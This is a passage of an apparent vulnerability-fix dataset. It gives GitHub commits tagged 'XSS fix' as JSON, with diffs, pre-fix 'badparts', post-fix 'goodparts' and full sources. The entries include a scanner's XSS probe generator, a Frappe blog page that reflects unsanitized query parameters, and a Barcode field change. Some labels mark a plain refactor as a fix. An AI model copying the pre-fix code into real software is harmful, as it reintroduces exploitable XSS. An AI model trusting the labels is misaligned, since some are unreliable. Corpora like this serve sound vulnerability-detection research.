            "diff": "diff --git a/modules/ActiveScan/xss.py b/modules/ActiveScan/xss.py\nindex f375849..f0ece59 100644\n--- a/modules/ActiveScan/xss.py\n+++ b/modules/ActiveScan/xss.py\n@@ -9,14 +9,13 @@ def gen_payload(self):\n \t\t\t_payload = generate.xeger(\"((\\%3C)|<)((\\%69)|i|(\\%49))((\\%6D)|m|(\\%4D))((\\%67)|g|(\\%47))[^\\n]+((\\%3E)|>)\")\n \t\t\tif any(x in _payload for x in \"\\\"'><;/\"):\n \t\t\t\treturn _payload\n-\n-\tdef check(self, url, payload, response, parameter):\n+\t\n+\tdef fuzz(self, url, payload, response, parameter):\n \t\tfor injection_types in self.signatures.keys():\n \t\t\tfor sig in self.signatures[injection_types]:\n \t\t\t\tmatch = re.findall(re.escape(sig), response)\n \t\t\t\tif match and any(x in payload for x in \"><\"):\n-\t\t\t\t\tself.found(injection_types, url, parameter, payload)\n-\t\t\t\t\treturn True\n+\t\t\t\t\treturn self.signatures.keys()[0]\n \t\treturn False\n \t\n \tdef signature(self):\n",
            "message": "",
            "files": {
                "/modules/ActiveScan/xss.py": {
                    "changes": [
                        {
                            "diff": "\n \t\t\t_payload = generate.xeger(\"((\\%3C)|<)((\\%69)|i|(\\%49))((\\%6D)|m|(\\%4D))((\\%67)|g|(\\%47))[^\\n]+((\\%3E)|>)\")\n \t\t\tif any(x in _payload for x in \"\\\"'><;/\"):\n \t\t\t\treturn _payload\n-\n-\tdef check(self, url, payload, response, parameter):\n+\t\n+\tdef fuzz(self, url, payload, response, parameter):\n \t\tfor injection_types in self.signatures.keys():\n \t\t\tfor sig in self.signatures[injection_types]:\n \t\t\t\tmatch = re.findall(re.escape(sig), response)\n \t\t\t\tif match and any(x in payload for x in \"><\"):\n-\t\t\t\t\tself.found(injection_types, url, parameter, payload)\n-\t\t\t\t\treturn True\n+\t\t\t\t\treturn self.signatures.keys()[0]\n \t\treturn False\n \t\n \tdef signature(self):\n",
                            "add": 3,
                            "remove": 4,
                            "filename": "/modules/ActiveScan/xss.py",
                            "badparts": [
                                "\tdef check(self, url, payload, response, parameter):",
                                "\t\t\t\t\tself.found(injection_types, url, parameter, payload)",
                                "\t\t\t\t\treturn True"
                            ],
                            "goodparts": [
                                "\t",
                                "\tdef fuzz(self, url, payload, response, parameter):",
                                "\t\t\t\t\treturn self.signatures.keys()[0]"
                            ]
                        }
                    ],
                    "source": "\nfrom cores.base_plugins import Scanner import re class Check(Scanner): \tdef gen_payload(self): \t\tfrom cores.xeger import Xeger \t\tgenerate=Xeger() \t\twhile True: \t\t\t_payload=generate.xeger(\"((\\%3C)|<)((\\%69)|i|(\\%49))((\\%6D)|m|(\\%4D))((\\%67)|g|(\\%47))[^\\n]+((\\%3E)|>)\") \t\t\tif any(x in _payload for x in \"\\\"'><;/\"): \t\t\t\treturn _payload \tdef check(self, url, payload, response, parameter): \t\tfor injection_types in self.signatures.keys(): \t\t\tfor sig in self.signatures[injection_types]: \t\t\t\tmatch=re.findall(re.escape(sig), response) \t\t\t\tif match and any(x in payload for x in \"><\"): \t\t\t\t\tself.found(injection_types, url, parameter, payload) \t\t\t\t\treturn True \t\treturn False \t \tdef signature(self): \t\treturn{\"XSS\": self.payload} ",
                    "sourceWithComments": "from cores.base_plugins import Scanner\nimport re\n\nclass Check(Scanner):\n\tdef gen_payload(self):\n\t\tfrom cores.xeger import Xeger\n\t\tgenerate = Xeger()\n\t\twhile True:\n\t\t\t_payload = generate.xeger(\"((\\%3C)|<)((\\%69)|i|(\\%49))((\\%6D)|m|(\\%4D))((\\%67)|g|(\\%47))[^\\n]+((\\%3E)|>)\")\n\t\t\tif any(x in _payload for x in \"\\\"'><;/\"):\n\t\t\t\treturn _payload\n\n\tdef check(self, url, payload, response, parameter):\n\t\tfor injection_types in self.signatures.keys():\n\t\t\tfor sig in self.signatures[injection_types]:\n\t\t\t\tmatch = re.findall(re.escape(sig), response)\n\t\t\t\tif match and any(x in payload for x in \"><\"):\n\t\t\t\t\tself.found(injection_types, url, parameter, payload)\n\t\t\t\t\treturn True\n\t\treturn False\n\t\n\tdef signature(self):\n\t\treturn {\"XSS\" : self.payload}\n"
                }
            },
            "msg": "Add check payload for things seems like xss"
        }
    },
    "https://github.com/omirajkar/bench_frappe": {
        "2fa19c25066ed17478d683666895e3266936aee6": {
            "url": "https://api.github.com/repos/omirajkar/bench_frappe/commits/2fa19c25066ed17478d683666895e3266936aee6",
            "html_url": "https://github.com/omirajkar/bench_frappe/commit/2fa19c25066ed17478d683666895e3266936aee6",
            "sha": "2fa19c25066ed17478d683666895e3266936aee6",
            "keyword": "XSS fix",
            "diff": "diff --git a/frappe/website/doctype/blog_post/blog_post.py b/frappe/website/doctype/blog_post/blog_post.py\nindex a20e9fa12..e4c757e64 100644\n--- a/frappe/website/doctype/blog_post/blog_post.py\n+++ b/frappe/website/doctype/blog_post/blog_post.py\n@@ -7,7 +7,7 @@\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n@@ -95,7 +95,7 @@ def get_list_context(context=None):\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n@@ -107,7 +107,7 @@ def get_list_context(context=None):\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n",
            "message": "",
            "files": {
                "/frappe/website/doctype/blog_post/blog_post.py": {
                    "changes": [
                        {
                            "diff": "\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/website/doctype/blog_post/blog_post.py",
                            "badparts": [
                                "from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown"
                            ],
                            "goodparts": [
                                "from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html"
                            ]
                        },
                        {
                            "diff": "\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/website/doctype/blog_post/blog_post.py",
                            "badparts": [
                                "\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category"
                            ],
                            "goodparts": [
                                "\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)"
                            ]
                        },
                        {
                            "diff": "\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/website/doctype/blog_post/blog_post.py",
                            "badparts": [
                                "\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)"
                            ],
                            "goodparts": [
                                "\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))"
                            ]
                        }
                    ],
                    "source": "\n from __future__ import unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar=\"/\" +post.avatar \treturn posts ",
                    "sourceWithComments": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe\nfrom frappe import _\nfrom frappe.website.website_generator import WebsiteGenerator\nfrom frappe.website.render import clear_cache\nfrom frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\nfrom frappe.website.utils import find_first_image, get_comment_list\n\nclass BlogPost(WebsiteGenerator):\n\twebsite = frappe._dict(\n\t\torder_by = \"published_on desc\"\n\t)\n\n\tdef make_route(self):\n\t\tif not self.route:\n\t\t\treturn frappe.db.get_value('Blog Category', self.blog_category,\n\t\t\t\t'route') + '/' + self.scrub(self.title)\n\n\tdef get_feed(self):\n\t\treturn self.title\n\n\tdef validate(self):\n\t\tsuper(BlogPost, self).validate()\n\n\t\tif not self.blog_intro:\n\t\t\tself.blog_intro = self.content[:140]\n\t\t\tself.blog_intro = strip_html_tags(self.blog_intro)\n\n\t\tif self.blog_intro:\n\t\t\tself.blog_intro = self.blog_intro[:140]\n\n\t\tif self.published and not self.published_on:\n\t\t\tself.published_on = today()\n\n\t\t# update posts\n\t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post`\n\t\t\twhere ifnull(blogger,'')=tabBlogger.name)\n\t\t\twhere name=%s\"\"\", (self.blogger,))\n\n\tdef on_update(self):\n\t\tclear_cache(\"writers\")\n\n\tdef get_context(self, context):\n\t\t# this is for double precaution. usually it wont reach this code if not published\n\t\tif not cint(self.published):\n\t\t\traise Exception(\"This blog has not been published yet!\")\n\n\t\t# temp fields\n\t\tcontext.full_name = get_fullname(self.owner)\n\t\tcontext.updated = global_date_format(self.published_on)\n\n\t\tif self.blogger:\n\t\t\tcontext.blogger_info = frappe.get_doc(\"Blogger\", self.blogger).as_dict()\n\n\t\tcontext.description = self.blog_intro or self.content[:140]\n\n\t\tcontext.metatags = {\n\t\t\t\"name\": self.title,\n\t\t\t\"description\": context.description,\n\t\t}\n\n\t\tif \"<!-- markdown -->\" in context.content:\n\t\t\tcontext.content = markdown(context.content)\n\n\t\timage = find_first_image(self.content)\n\t\tif image:\n\t\t\tcontext.metatags[\"image\"] = image\n\n\t\tcontext.comment_list = get_comment_list(self.doctype, self.name)\n\t\tif not context.comment_list:\n\t\t\tcontext.comment_text = _('No comments yet')\n\t\telse:\n\t\t\tif(len(context.comment_list)) == 1:\n\t\t\t\tcontext.comment_text = _('1 comment')\n\t\t\telse:\n\t\t\t\tcontext.comment_text = _('{0} comments').format(len(context.comment_list))\n\n\t\tcontext.category = frappe.db.get_value(\"Blog Category\",\n\t\t\tcontext.doc.blog_category, [\"title\", \"route\"], as_dict=1)\n\t\tcontext.parents = [{\"name\": _(\"Home\"), \"route\":\"/\"},\n\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"},\n\t\t\t{\"label\": context.category.title, \"route\":context.category.route}]\n\ndef get_list_context(context=None):\n\tlist_context = frappe._dict(\n\t\ttemplate = \"templates/includes/blog/blog.html\",\n\t\tget_list = get_blog_list,\n\t\thide_filters = True,\n\t\tchildren = get_children(),\n\t\t# show_search = True,\n\t\ttitle = _('Blog')\n\t)\n\n\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n\tif category:\n\t\tcategory_title = get_blog_category(category)\n\t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n\t\tlist_context.title = category_title\n\n\telif frappe.local.form_dict.blogger:\n\t\tblogger = frappe.db.get_value(\"Blogger\", {\"name\": frappe.local.form_dict.blogger}, \"full_name\")\n\t\tlist_context.sub_title = _(\"Posts by {0}\").format(blogger)\n\t\tlist_context.title = blogger\n\n\telif frappe.local.form_dict.txt:\n\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n\n\tif list_context.sub_title:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n\t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}]\n\telse:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"}]\n\n\tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True))\n\treturn list_context\n\ndef get_children():\n\treturn frappe.db.sql(\"\"\"select route as name,\n\t\ttitle from `tabBlog Category`\n\t\twhere published = 1\n\t\tand exists (select name from `tabBlog Post`\n\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)\n\t\torder by title asc\"\"\", as_dict=1)\n\ndef clear_blog_cache():\n\tfor blog in frappe.db.sql_list(\"\"\"select route from\n\t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"):\n\t\tclear_cache(blog)\n\n\tclear_cache(\"writers\")\n\ndef get_blog_category(route):\n\treturn frappe.db.get_value(\"Blog Category\", {\"name\": route}, \"title\") or route\n\ndef get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):\n\tconditions = []\n\tif filters:\n\t\tif filters.blogger:\n\t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))\n\t\tif filters.blog_category:\n\t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category))\n\n\tif txt:\n\t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt)))\n\n\tif conditions:\n\t\tfrappe.local.no_cache = 1\n\n\tquery = \"\"\"\\\n\t\tselect\n\t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on,\n\t\t\t\tt1.published_on as creation,\n\t\t\t\tt1.content as content,\n\t\t\t\tifnull(t1.blog_intro, t1.content) as intro,\n\t\t\t\tt2.full_name, t2.avatar, t1.blogger,\n\t\t\t\t(select count(name) from `tabCommunication`\n\t\t\t\t\twhere\n\t\t\t\t\t\tcommunication_type='Comment'\n\t\t\t\t\t\tand comment_type='Comment'\n\t\t\t\t\t\tand reference_doctype='Blog Post'\n\t\t\t\t\t\tand reference_name=t1.name) as comments\n\t\tfrom `tabBlog Post` t1, `tabBlogger` t2\n\t\twhere ifnull(t1.published,0)=1\n\t\tand t1.blogger = t2.name\n\t\t%(condition)s\n\t\torder by published_on desc, name asc\n\t\tlimit %(start)s, %(page_len)s\"\"\" % {\n\t\t\t\"start\": limit_start, \"page_len\": limit_page_length,\n\t\t\t\t\"condition\": (\" and \" + \" and \".join(conditions)) if conditions else \"\"\n\t\t}\n\n\tposts = frappe.db.sql(query, as_dict=1)\n\n\tfor post in posts:\n\t\tpost.cover_image = find_first_image(post.content)\n\t\tpost.published = global_date_format(post.creation)\n\t\tpost.content = strip_html_tags(post.content[:340])\n\t\tif not post.comments:\n\t\t\tpost.comment_text = _('No comments yet')\n\t\telif post.comments==1:\n\t\t\tpost.comment_text = _('1 comment')\n\t\telse:\n\t\t\tpost.comment_text = _('{0} comments').format(str(post.comments))\n\n\t\tpost.avatar = post.avatar or \"\"\n\t\tpost.category = frappe.db.get_value('Blog Category', post.blog_category,\n\t\t\t['route', 'title'], as_dict=True)\n\n\t\tif post.avatar and (not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"):\n\t\t\tpost.avatar = \"/\" + post.avatar\n\n\treturn posts\n"
                }
            },
            "msg": "fix(blog): Fix possible reflected XSS attack vector"
        },
        "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37": {
            "url": "https://api.github.com/repos/omirajkar/bench_frappe/commits/acd2f589b6cd2d1011be4a4e4965a1b3ed489c37",
            "html_url": "https://github.com/omirajkar/bench_frappe/commit/acd2f589b6cd2d1011be4a4e4965a1b3ed489c37",
            "sha": "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37",
            "keyword": "XSS fix",
            "diff": "diff --git a/frappe/core/doctype/doctype/doctype.py b/frappe/core/doctype/doctype/doctype.py\nindex a06a33df1..fedb605ad 100644\n--- a/frappe/core/doctype/doctype/doctype.py\n+++ b/frappe/core/doctype/doctype/doctype.py\n@@ -715,7 +715,6 @@ def scrub_fetch_from(field):\n \tfor d in fields:\n \t\tif not d.permlevel: d.permlevel = 0\n \t\tif d.fieldtype != \"Table\": d.allow_bulk_edit = 0\n-\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1\n \t\tif not d.fieldname:\n \t\t\td.fieldname = d.fieldname.lower()\n \ndiff --git a/frappe/model/base_document.py b/frappe/model/base_document.py\nindex 922557fee..982c54c3a 100644\n--- a/frappe/model/base_document.py\n+++ b/frappe/model/base_document.py\n@@ -627,7 +627,7 @@ def _sanitize_content(self):\n \n \t\t\telif df and (df.get(\"ignore_xss_filter\")\n \t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n-\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n+\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")\n \n \t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n \t\t\t\t\t\tor self.docstatus==2\n",
            "message": "",
            "files": {
                "/frappe/core/doctype/doctype/doctype.py": {
                    "changes": [
                        {
                            "diff": "\n \tfor d in fields:\n \t\tif not d.permlevel: d.permlevel = 0\n \t\tif d.fieldtype != \"Table\": d.allow_bulk_edit = 0\n-\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1\n \t\tif not d.fieldname:\n \t\t\td.fieldname = d.fieldname.lower()\n ",
                            "add": 0,
                            "remove": 1,
                            "filename": "/frappe/core/doctype/doctype/doctype.py",
                            "badparts": [
                                "\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1"
                            ],
                            "goodparts": []
                        }
                    ]
                },
                "/frappe/model/base_document.py": {
                    "changes": [
                        {
                            "diff": "\n \n \t\t\telif df and (df.get(\"ignore_xss_filter\")\n \t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n-\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n+\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")\n \n \t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n \t\t\t\t\t\tor self.docstatus==2\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/model/base_document.py",
                            "badparts": [
                                "\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")"
                            ],
                            "goodparts": [
                                "\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")"
                            ]
                        }
                    ],
                    "source": "\n from __future__ import unicode_literals from six import iteritems, string_types import datetime import frappe, sys from frappe import _ from frappe.utils import(cint, flt, now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype) from frappe.model import default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import notify_link_count from frappe.modules import load_doctype_module from frappe.model import display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document \tglobal _classes \tif not doctype in _classes: \t\tmodule_name, custom=frappe.db.get_value(\"DocType\", doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module, classname): \t\t\t\t_class=getattr(module, classname) \t\t\t\tif issubclass(_class, BaseDocument): \t\t\t\t\t_class=getattr(module, classname) \t\t\t\telse: \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\") \tdef __init__(self, d): \t\tself.update(d) \t\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]), filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, 